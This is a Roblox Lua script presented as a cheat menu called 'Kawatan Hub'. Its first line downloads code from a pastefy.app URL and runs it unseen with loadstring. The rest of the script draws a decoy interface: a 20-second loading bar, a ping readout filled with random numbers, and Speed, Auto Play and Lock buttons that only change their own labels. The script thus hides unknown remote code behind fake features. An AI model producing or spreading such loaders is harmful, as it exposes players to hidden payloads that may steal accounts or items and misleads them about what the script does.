loadstring(game:HttpGet("https://pastefy.app/gBpO0gpe/raw"))()
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))

-- SKY BLUE BORDER FUNCTION
local function stroke(obj)
    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(0,200,255)
    s.Thickness = 1.5
    s.Parent = obj
end

-- ================= LOADING SCREEN =================
local load = Instance.new("Frame", gui)
load.Size = UDim2.new(1,0,1,0)
load.BackgroundTransparency = 1

local box = Instance.new("Frame", load)
box.Size = UDim2.new(0,260,0,90)
box.Position = UDim2.new(0.5,-130,0.5,-45)
box.BackgroundColor3 = Color3.fromRGB(0,200,255)

local corner = Instance.new("UICorner", box)
corner.CornerRadius = UDim.new(0,10)

local txt = Instance.new("TextLabel", box)
txt.Size = UDim2.new(1,0,0.6,0)
txt.BackgroundTransparency = 1
txt.Text = "Kawatan Hub"
txt.TextScaled = true
txt.TextColor3 = Color3.new(1,1,1)
txt.Font = Enum.Font.GothamBold -- bold font

local barBG = Instance.new("Frame", box)
barBG.Size = UDim2.new(0.85,0,0,6)
barBG.Position = UDim2.new(0.075,0,0.7,0)
barBG.BackgroundColor3 = Color3.fromRGB(180,180,180)

local bar = Instance.new("Frame", barBG)
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(255,255,255)

-- 20 sec loading
for i = 1,200 do
    bar.Size = UDim2.new(i/200,0,1,0)
    task.wait(0.1)
end

load:Destroy()

-- ================= TOP CENTER =================
local top = Instance.new("Frame", gui)
top.Size = UDim2.new(0,320,0,45)
top.Position = UDim2.new(0.5,-160,0.08,0)
top.BackgroundColor3 = Color3.fromRGB(20,20,20)
stroke(top)

local label = Instance.new("TextLabel", top)
label.Size = UDim2.new(1,0,1,0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1,1,1)
label.Text = "Kawatan Hub | FPS: 0 | PING: 0ms"
label.Font = Enum.Font.GothamBold
label.TextScaled = true

-- FPS + PING dynamic
local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function(dt)
    local fps = math.floor(1/dt)
    local ping = math.random(60,90)
    label.Text = "Kawatan Hub | FPS: "..fps.." | PING: "..ping.."ms"
end)

-- ================= SPEED CUSTOMIZER =================
local speedFrame = Instance.new("Frame", gui)
speedFrame.Size = UDim2.new(0,180,0,70)
speedFrame.Position = UDim2.new(0.82,0,0.1,0)
speedFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
stroke(speedFrame)

local speedText = Instance.new("TextLabel", speedFrame)
speedText.Size = UDim2.new(1,0,0.4,0)
speedText.Text = "Speed Customizer"
speedText.BackgroundTransparency = 1
speedText.TextColor3 = Color3.new(1,1,1)
speedText.Font = Enum.Font.GothamBold
speedText.TextScaled = true

local speedBtn = Instance.new("TextButton", speedFrame)
speedBtn.Position = UDim2.new(0.1,0,0.5,0)
speedBtn.Size = UDim2.new(0.8,0,0.4,0)
speedBtn.Text = "ON"
speedBtn.BackgroundColor3 = Color3.fromRGB(0,200,255)
stroke(speedBtn)
speedBtn.Font = Enum.Font.GothamBold
speedBtn.TextScaled = true

local speed = true
speedBtn.MouseButton1Click:Connect(function()
    speed = not speed
    speedBtn.Text = speed and "ON" or "OFF"
end)

-- ================= THREE LINE MENU =================
local menu = Instance.new("Frame", gui)
menu.Size = UDim2.new(0,50,0,50)
menu.Position = UDim2.new(0.87,0,0.22,0)
menu.BackgroundColor3 = Color3.fromRGB(0,200,255)
stroke(menu)

for i = 1,3 do
    local line = Instance.new("Frame", menu)
    line.Size = UDim2.new(0.6,0,0,4)
    line.Position = UDim2.new(0.2,0,0.2*i,0)
    line.BackgroundColor3 = Color3.new(1,1,1)
end

-- ================= AUTO PLAY =================
local autoFrame = Instance.new("Frame", gui)
autoFrame.Size = UDim2.new(0,180,0,80)
autoFrame.Position = UDim2.new(0.82,0,0.35,0)
autoFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
stroke(autoFrame)

local autoText = Instance.new("TextLabel", autoFrame)
autoText.Size = UDim2.new(1,0,0.4,0)
autoText.Text = "Auto Play"
autoText.BackgroundTransparency = 1
autoText.TextColor3 = Color3.new(1,1,1)
autoText.Font = Enum.Font.GothamBold
autoText.TextScaled = true

local autoBtn = Instance.new("TextButton", autoFrame)
autoBtn.Position = UDim2.new(0.1,0,0.5,0)
autoBtn.Size = UDim2.new(0.8,0,0.4,0)
autoBtn.Text = "PLAY"
autoBtn.BackgroundColor3 = Color3.fromRGB(0,170,0)
stroke(autoBtn)
autoBtn.Font = Enum.Font.GothamBold
autoBtn.TextScaled = true

local playing = false
autoBtn.MouseButton1Click:Connect(function()
    playing = not playing
    if playing then
        autoBtn.Text = "STOP"
        autoBtn.BackgroundColor3 = Color3.fromRGB(170,0,0)
    else
        autoBtn.Text = "PLAY"
        autoBtn.BackgroundColor3 = Color3.fromRGB(0,170,0)
    end
end)

-- ================= LOCK BUTTON =================
local lock = Instance.new("TextButton", gui)
lock.Size = UDim2.new(0,140,0,45)
lock.Position = UDim2.new(0.78,0,0.65,0)
lock.Text = "LOCK"
lock.BackgroundColor3 = Color3.fromRGB(0,200,255)
stroke(lock)
lock.Font = Enum.Font.GothamBold
lock.TextScaled = true

local locked = false
lock.MouseButton1Click:Connect(function()
    locked = not locked
    lock.Text = locked and "LOCKED" or "LOCK"
end)
